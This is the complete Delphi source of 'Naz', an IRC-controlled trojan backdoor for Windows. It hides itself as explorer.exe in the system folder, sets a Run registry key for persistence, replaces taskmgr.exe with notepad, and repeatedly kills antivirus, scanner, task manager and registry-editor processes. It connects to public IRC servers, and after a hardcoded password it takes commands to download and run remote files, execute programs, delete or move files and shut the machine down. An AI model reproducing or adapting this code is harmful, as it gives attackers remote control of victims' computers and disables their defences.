   { **************************************************************************** }
   {                                                                              }
   {                 Name            : Naz - Irc Bot                              }
   {                 Version         : 1.0                                        }
   {                 Exe Size        : 21.504 | 11.776 (c)                        }
   {                 Compiler : Borland Delphi 7                                  }
   {                 Use Ctrl+F9 and make.bat to compile                          }
   {                 Copyright :                                                  }
   {                 Niklaus / Ronop Programming And Security Group               }
   {                 niklaus@ronop.com / Turkey                                   }
   {                                                                              }
   { **************************************************************************** }
   {$A+,B-,C-,D-,E-,F-,G+,H+,I-,J-,K-,L-,M-,N+,O+,P+,Q-,R-,S-,T-,U-,V+,W-,X+,Y-,Z1}
   {$MINSTACKSIZE $00004000}
   {$MAXSTACKSIZE $00100000}
   {$IMAGEBASE $00400000}
   {$R Icon.Res}
   { **************************************************************************** }
   Program Naz;
   { **************************************************************************** }
   Uses
     Windows,
     Messages,
     Winsock,
     TlHelp32;

   Const {Constants - Sabitler}
    RegName='Explorer';
    PrName='explorer.exe';
    MutexName='ILoveNaz';
    ServerClass='0xFF0A';
    SM_CONNECT  = WM_USER + 159;
    SM_SOCKET   = WM_USER + 160;
    SleepTime=10000;
    Port=6667;
    CrLf=#13#10;
    Kanal='konak';
    Anahtar='niklaus';
    PfiX='~';
    Sifre='Nc01TtK';

   Type
    TApplication = Class (TObject)
     Private
     FClosing : Boolean;
     FLogIn : Boolean;
     TheMessage : TMsg;
     WindowHandle: HWND;
     Inst : HWnd;
     mHandle : THandle;
     Wsdata : WSADATA;                       {  Winsock Identifications           }
     Client : TSocket;                       {  Winsock Tanimlamalari             }
     aSockAddr_in : SockAddr_in;             {                                    }
     Function ControlOneInstance(MutexName:String):Boolean;
     Procedure DeleteInstance;
     Procedure SocketInit;
     Procedure SendStr(Sock:TSocket;Str:String);
     Procedure ParseMsg(Msg:String);
     Procedure ParsePrivMsg(Msg:String);
     Protected
      Function RegisterWindowClass:Boolean;
      Function WndProc(TheWindow: HWnd; TheMessage, WParam,LParam: Longint): Longint;
      Procedure CreateWnd;
     Public
      Constructor Create;
      Destructor Destroy; override;
      Procedure Run;
      Procedure Close;
    End;
   TRegisterServiceProcess = function(dwProcessID,dwType: DWord) : DWord; stdcall;
   Var
   Application : TApplication;
   Sonuc1:String; {Main App : Windir+PrName}
   Buf: Array[0..1023] Of Char;Str1:AnsiString;
   TheNick,TheMsg:String;
   ServerAddrList : Array [1..3] Of Pchar =
    (
    '194.134.5.82',   //   us.undernet.org
    '193.110.95.1',   //   eu.undernet.org
    '205.252.46.98'   //  irc.undernet.org
    );
   { **************************************************************************** }
   Function UrlDownloadToFile(Caller:LongWord;Url:Pchar;FileName:Pchar;Reserved:LongWord;StatusCB:LongWord):HResult;
   stdcall; external 'urlmon.dll' name 'URLDownloadToFileA'; {Dosya indirmek için gereken fonksyon}
   function InternetGetConnectedState(lpdwFlags: LPDWORD; dwReserved: DWORD): BOOL;
   stdcall; external 'wininet.dll' name 'InternetGetConnectedState'; {Internet Baglantisini kontrol etmek için}
   function ShellExecute(hWnd: HWND; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer):integer;
   stdcall; external 'shell32.dll' name 'ShellExecuteA'; {Dosya çalistirmak için gereken fonksyon}
   {  SysUtils Begin }
   {$I sysutils.inc}
   Function UpperCase(Txt:String):String;
   Var
   i1:Integer;
   Begin
   Result:='';
   For i1:=0 To Length(Txt) Do
   Begin
   If (Ord(Txt[i1])>=97) And (Ord(Txt[i1])<=122)Then
   Txt[i1]:=Chr(Ord(Txt[i1])-32);
   End;
   Result:=Txt;
   End;
   Function LowerCase(Txt:String):String;
   Var
   i1:Integer;
   Begin
   Result:='';
   For i1:=0 To Length(Txt) Do
   Begin
   If (Ord(Txt[i1])>=65) And (Ord(Txt[i1])<=90)Then
   Txt[i1]:=Chr(Ord(Txt[i1])+32);
   End;
   Result:=Txt;
   End;
   Function Temizle(Txt:String):String;
   Var
   p1:Integer;
   Begin
   Result:='';
   For p1:=0 To Length(Txt) Do
   If ((Txt[p1]>='A') And (Txt[p1]<='Z')) Or ((Txt[p1]>='a') And (Txt[p1]<='z')) Then
   Begin
   Result:=Result+Txt[p1];If p1>=8 Then Break;
   End;
   End;

   Function Windizin:String;
   Var
   Windir:Pchar;
   Begin
    Getmem(Windir,100);
    GetWindowsDirectory(Windir,100);
    Result:=Windir+'\';
    Freemem(Windir);
   End;
   Function Sysdizin:String;
   Var
   SysDir:Pchar;
   Begin
    Getmem(SysDir,100);
    GetSystemDirectory(SysDir,100);
    Result:=SysDir+'\';
    Freemem(SysDir);
   End;

   Function BoslukOku(Str:String;Num:Integer):String; //Returns the Numth token in Str
   Var
   Str1:Array[1..20] Of String;
   i,g1,i1,l1:Integer;
   Begin
   Result:='';
   For i:=1 to Num Do
   Begin
    g1:=Pos(Chr(32),Str);
    If g1>0 Then
    Begin
    Str1[i]:=Copy(Str,0,g1-1);
    Str:=Copy(Str,g1+1,Length(Str)-g1);
    l1 := Length(Str);
    i1 := 1;
    While (i1 <= l1) And (Str[i1] <= ' ') Do Inc(i1);
    While Str[l1] <= ' ' Do Dec(l1);
    Str := Copy(Str, i1, l1 - i1 + 1);
    If i=Num Then Result:=Str1[i];
    End Else Result:=Str;
   End;
   End;
   Procedure WindowsKapat(Parametre1:Integer);
   Begin
    Case Parametre1 Of
     1: ExitWindows(EW_RESTARTWINDOWS,0);
     2: ExitWindows(EW_REBOOTSYSTEM,0);
     3: ExitWindowsEx(EWX_REBOOT,0);
     4: ExitWindowsEx(EWX_SHUTDOWN,0);
     5: ExitWindowsEx(EWX_FORCE,0);
     6: ExitWindowsEx(EWX_POWEROFF,0);
    End;
   End;
   Function AutoStart(WormLocation,RegAdi:String):String;
   Var
   HndKey:Hkey;
   Begin
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,'Software\Microsoft\Windows\CurrentVersion\Run',1,KEY_ALL_ACCESS,HndKey);
   RegSetValueEx(hndKey,Pchar(RegAdi),0,REG_SZ,Pchar(WormLocation),Length(WormLocation));
   RegCloseKey(hndKey);
   End;

   Function ikiAraOku(okunan ,bas, son : AnsiString): AnsiString;
   Begin
     Result:=Copy(Okunan, Pos(bas, okunan)+(Length(bas)), (Pos(son, okunan)- Pos(bas, okunan))-Length(Son) );
   End;

   Procedure DosyaIndir(Icerik:String;Parametre:Integer);
   Begin
   UrlDownloadToFile(0, PChar(BoslukOku(Icerik,1)), PChar(BoslukOku(Icerik,2)), 0, 0);
   If (Parametre=1) And ( FileExists(BoslukOku(Icerik,2)) ) Then
   ShellExecute(GetDesktopWindow, 'open',PChar(BoslukOku(Icerik,2)), nil, nil, 0);
   End;
   {
   Function regReadString(kRoot: HKEY; sKey, sValue: String): String;
   var
     qValue: array[0..1023] of Char;
     DataSize: Integer;
     CurrentKey: HKEY;
   begin
     RegOpenKeyEx(kRoot, PChar(sKey), 0, KEY_ALL_ACCESS, CurrentKey);
     Datasize := 1023;
     RegQueryValueEx(CurrentKey, PChar(sValue), nil, nil, @qValue[0], @DataSize);
     RegCloseKey(CurrentKey);
     Result := String(qValue);
   end;
   }
   {  SysUtils End }
   { **************************************************************************** }
   Function KillTask(ExeFileName: string): Integer;
   const
     PROCESS_TERMINATE = $0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
   begin
     Result := 0;
     FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);

     while Integer(ContinueLoop) <> 0 do
     begin
       If Pos(UpperCase(ExeFileName),UpperCase(FProcessEntry32.szExeFile))<>0 Then
         Result := Integer(TerminateProcess(
                           OpenProcess(PROCESS_TERMINATE,
                                       BOOL(0),
                                       FProcessEntry32.th32ProcessID),
                                       0));
        ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
     end;
     CloseHandle(FSnapshotHandle);
   end;
   Procedure KayitAyarlari(Value:Boolean);
   Var
     BufSize:Integer;
     Deger:Integer;HndKey:Hkey;
   Begin
   RegOpenKeyEx(HKEY_CURRENT_USER,
    'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
    1,KEY_ALL_ACCESS,HndKey);
   Deger:=Ord(Value);
   BufSize:=SizeOf(Deger);
   RegSetValueEx(hndKey,'DisableRegistryTools',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(hndKey);

   RegOpenKeyEx(HKEY_CURRENT_USER,
   'Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced',
   1,KEY_ALL_ACCESS,HndKey);
   Deger:=ord(2);
   BufSize:=SizeOf(Deger);
   RegSetValueEx(hndKey,'Hidden',0,REG_DWORD,@Deger,BufSize);
   Deger:=ord(1);
   BufSize:=SizeOf(Deger);
   RegSetValueEx(hndKey,'HideFileExt',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(HndKey);
   End;
   Procedure AvFwKill;
   var
     Proc   : TProcessEntry32;
     Snap   : THandle;
     Kelime : String;
   Begin
     Snap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS,0);
     Proc.dwSize := SizeOf(TProcessEntry32);
     Process32First(Snap,Proc);
     Repeat
      Kelime:=String(Proc.szExeFile);
      If (Pos('AV',UpperCase(Kelime)) <> 0) Or (Pos('SCAN',UpperCase(Kelime)) <> 0) Or (Pos('TASK',UpperCase(Kelime)) <> 0) Or (Pos('REG',UpperCase(Kelime)) <> 0) Then Begin Killtask(Kelime); Sleep(1000); End;
     Until (not Process32Next(Snap,Proc));
     { AutoStart Ekle}
     AutoStart(Sonuc1,Regname);
   End;
   Procedure HideApp;
   Var
    hKernel32: HInst;
    RegisterServiceProcess: TRegisterServiceProcess;
   Begin
    hKernel32 := LoadLibrary('Kernel32.dll');
    If hKernel32 <> HInst(nil) then
    RegisterServiceProcess := GetProcAddress(hKernel32,'RegisterServiceProcess')
    Else RegisterServiceProcess := nil;
    If Assigned(RegisterServiceProcess) Then
    RegisterServiceProcess(GetCurrentProcessID,1)
    Else SystemParametersInfo(SPI_SCREENSAVERRUNNING,1,nil,0);
   End;
   { **************************************************************************** }
   {           Code Part - Begin           }
   Constructor TApplication.Create;
   Begin
   FClosing := False;
   Sonuc1:=SysDizin+PrName;

   If (ControlOneInstance(MutexName)) Then FClosing := True;
   If (UpperCase(ParamStr(0)) <> UpperCase(Sonuc1)) Then
   Begin
    FClosing := True;
    If FileExists(Sonuc1) Then DeleteFile(Pchar(Sonuc1));
    If Not FileExists(Sonuc1) Then
    CopyFile(Pchar(ParamStr(0)),Pchar(Sonuc1),False);
    AutoStart(Sonuc1,Regname);
    SetFileAttributes(PChar(Sonuc1),FILE_ATTRIBUTE_HIDDEN);
    If FileExists(Pchar(SysDizin+'notepad.exe')) Then
    CopyFile(Pchar(SysDizin+'notepad.exe'),Pchar(SysDizin+'taskmgr.exe'),False);
    If FileExists(Sonuc1) Then ShellExecute(GetDesktopWindow, 'open',PChar(Sonuc1), nil, nil, 0);
   End;
   End;
   { **************************************************************************** }
   function InitProc(TheWindow: HWnd; TheMessage, WParam,LParam: Longint): Longint; stdcall;
   begin
     Result := Application.WndProc(TheWindow, TheMessage, WParam, LParam);
   end;
   { **************************************************************************** }
   Destructor TApplication.Destroy;
   Begin
     DeleteInstance;//Remove Mutex
   //RemoveGlobalHook;
     inherited;
   End;
   { **************************************************************************** }
   Procedure TApplication.Run;
   Begin
    AvFwKill;
    HideApp;
   // KayitAyarlari(True);

    Inst := GetModuleHandle(nil);
    if not RegisterWindowClass then FClosing:=True else CreateWnd;

    SocketInit;{Socket Events}
    SetTimer(WindowHandle,1{Timer1},1000,@AvFwKill);

     While GetMessage(TheMessage,0,0,0) Do
     Begin
       TranslateMessage(TheMessage);
       DispatchMessage(TheMessage);
     End;
   End;
   { **************************************************************************** }
   function TApplication.RegisterWindowClass:Boolean;
   var
     WindowClass: TWndClass;
   begin
   ZeroMemory(@WindowClass, SizeOf(WindowClass));

     with WindowClass do begin
          Style := CS_CLASSDC or CS_PARENTDC;
          lpfnWndProc := @InitProc;
          hInstance := Inst;
          hCursor := LoadCursor(0, IDC_ARROW);
          hbrBackground := COLOR_WINDOW;
          lpszMenuName := nil;
          lpszClassName := ServerClass;
     end;
     Result := Windows.RegisterClass(WindowClass) <> 0;
   end;
   { **************************************************************************** }
   procedure TApplication.CreateWnd;
   Begin
     WindowHandle:= CreateWindow(ServerClass,
                                 nil,
                                 0,
                                 0,
                                 0,
                                 0,
                                 0,
                                 0,
                                 0,
                                 Inst,
                                 nil
                                 );
     If WindowHandle=0 then Application.Close;
   End;
   { **************************************************************************** }
   function TApplication.WndProc(TheWindow: HWnd; TheMessage, WParam, LParam: Integer): Longint;
   begin
   Result:=0;
   Case TheMessage of

    SM_SOCKET:
     Case Loword(LParam) Of
      FD_READ:
      Begin
      Buf:='';
      ZeroMemory(@Buf,SizeOf(Buf));{T}
      Recv(Client, Buf, SizeOf(Buf), 0);
      Str1:='';Str1:=Buf;
      If Str1<>'' Then ParseMsg(Str1);
      End;

      FD_CLOSE:
      Begin
      //Disconnect
      Sleep(SleepTime);
      SocketInit;
      Exit;
      End;
     End;

    WM_DESTROY:
    Begin
    Result:=0;
    PostQuitMessage(0);
    Exit;
    End;
   End;
     Result := DefWindowProc(TheWindow, TheMessage, WParam, LParam);
   end;
   { **************************************************************************** }
   procedure TApplication.SocketInit;
   Var
   {Irc Variables}
   Ident,Nickname,Mail,NameSurname:String;
   hHost,uHost:Pchar;dHost:Dword;
   begin
     CloseSocket(Client);
     FLogIn:=False;

     Repeat
     AvFwKill;
     Sleep(1000);
     Until InternetGetConnectedState(Nil,0);

     WSACleanup();
     WSAStartup($0101,Wsdata);
     Client:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
     aSockAddr_in.sin_family := AF_INET;Randomize;
     aSockAddr_in.sin_addr.s_addr:=Inet_Addr(ServerAddrList[Random(3)+1]);
     aSockAddr_in.sin_port:=htons(Port);
     If Connect(Client, aSockAddr_in, Sizeof(aSockAddr_in)) <> -1 Then
     Begin
     WsaaSyncSelect(Client,WindowHandle,SM_SOCKET,FD_READ or FD_CLOSE);

     dHost:=100;GetMem(hHost,100);GetMem(uHost,100);
     GetUserName(hHost,dHost);GetComputerName(uHost,dHost);
     Ident:=LowerCase(Temizle(uHost));If Ident='' Then Ident:=RandomStr(6);
     NickName:=LowerCase(Temizle(hHost));If NickName='' Then NickName:=RandomStr(6);
     Mail:=NickName+'@'+Ident+'.com';
     NameSurname:=NickName+' '+Ident;

     //Irc Server'a User ve Ident gönderilecek
     SendStr(Client,'USER '+Ident+' '+Mail+' Undernet :'+NameSurname+CrLf);
     SendStr(Client,'NICK '+NickName+CrLf);
     End Else Begin Sleep(SleepTime); SocketInit; End;
   End;
   { **************************************************************************** }
   Procedure TApplication.SendStr(Sock:TSocket;Str:String);
   Begin
    Send(Sock,Pointer(Str)^,Length(Str),0);
   End;
   { **************************************************************************** }
   Function PingParse(P_res: String): String;
   Var
   i,p1: integer;
   Begin
   Result:='';
   P1:=Pos(':',P_res);
    For i:=P1+1 to Length(P_res) Do
    Begin
     If ((P_res[i] <> #13) And (P_res[i] <> #10) And (P_res[i] <> #0)) Then
     Result:=Result+P_res[i] Else Break;
    End;
   End;
   Procedure TApplication.ParseMsg(Msg:String);
   Var
   Komut:String;
   Begin
   //MessageBox (0,pchar(Msg),'Gelen Veri',MB_OK+MB_ICONHAND+MB_SYSTEMMODAL);//Debug Code
   If UpperCase(Copy(Msg,1,4))='PING' Then SendStr(Client,'PONG '+PingParse(Msg)+CrLf);//Ping -> Pong
   If (Pos('376',Msg)>0) Or (Pos('422',Msg)>0) Then SendStr(Client,'JOIN :#'+Kanal+' '+Anahtar+CrLf);
   If (Pos('432',Msg)>0) Or (Pos('433',Msg)>0) Then SendStr(Client,'NICK '+RandomStr(6)+CrLf);//Invalid Nick
   Komut:=BoslukOku(Msg,2);
   {Events
   If Komut='KICK' Then SendStr(Client,'JOIN :#'+Kanal+' '+Anahtar+CrLf);
   //Join ise Kontrol Et Uygun Degilse KICK! Uygunsa OP!
   }

   //PrivMsg -> Trojan Komutlari
   //LogIn olacak
   If Komut='PRIVMSG' Then ParsePrivMsg(Msg);

   End;
   Procedure TApplication.ParsePrivMsg(Msg:String);
   Var
   Pos1:Integer;
   Komut,Parametre:Integer;
   Icerik:String;
   Begin
   Pos1:=Pos(':'+PfiX,Msg);
   If Pos1>0 Then
   Begin
    TheNick:=Copy(Msg,1,Pos('!',Msg)-1);
   // TheMsg:=EncryptDecrypt(Copy(Msg,Pos1+2,Length(Msg)-Pos1-2));
    TheMsg:=Copy(Msg,Pos1+2,Length(Msg)-Pos1-2);
    If TheMsg<>'' Then
    Begin
     If Not FLogIn Then
     Begin
     If Pos(Sifre,TheMsg)>0 Then Begin FLogIn:=True; End;//Log In!
     End
     Else
     Begin
      Komut:=StrToInt(ikiAraOku(TheMsg, '[', ']'));
      Icerik:=ikiAraOku(TheMsg, '(',')');
      Parametre:=StrToInt(ikiAraOku(TheMsg, '<','>'));
      Case Komut Of
      0: FLogIn:=False; //Log Out!
      1: SendStr(Client,Icerik+CrLf);
      2: DosyaIndir(Icerik,Parametre);
      3: ShellExecute(GetDesktopWindow,'open',PChar(Icerik),nil,nil,0);
      4: KillTask(Icerik);
      5: CopyFile(Pchar(BoslukOku(Icerik,1)),Pchar(BoslukOku(Icerik,2)),False);
      6: MoveFile(Pchar(BoslukOku(Icerik,1)),Pchar(BoslukOku(Icerik,2)));
      7: DeleteFile(Pchar(Icerik));
      8: WindowsKapat(Parametre);//ShutDown !
      9: SocketInit;//Reconnect !
      10: PostQuitMessage(0);//Close Me !
      {ToDo List}
    //11: SetupGlobalHook;
    //12: PStorage!
    //13: Upload File to FTP {File Manager}
    //14: SelfUpdate
      End;
     End;
    End;
   End;
   End;
   { **************************************************************************** }
   Procedure TApplication.Close;
   Begin
   PostQuitMessage(0);
   End;
   { **************************************************************************** }
   Function TApplication.ControlOneInstance(MutexName:String):Boolean;
   Begin
   Result:=False;
   mHandle := CreateMutex(nil, True, PAnsiChar(MutexName));
     If GetLastError = ERROR_ALREADY_EXISTS then
     Begin
       Result:=True;
     End;
   End;
   { **************************************************************************** }
   Procedure TApplication.DeleteInstance;
   Begin
   If mHandle <> 0 Then CloseHandle(mHandle)
   End;
   { **************************************************************************** }
   {            Code Part - End            }
   Begin
     Application := TApplication.Create;
     If Not Application.FClosing Then Application.Run
     Else Application.Close;
     Application.Free;
   End.


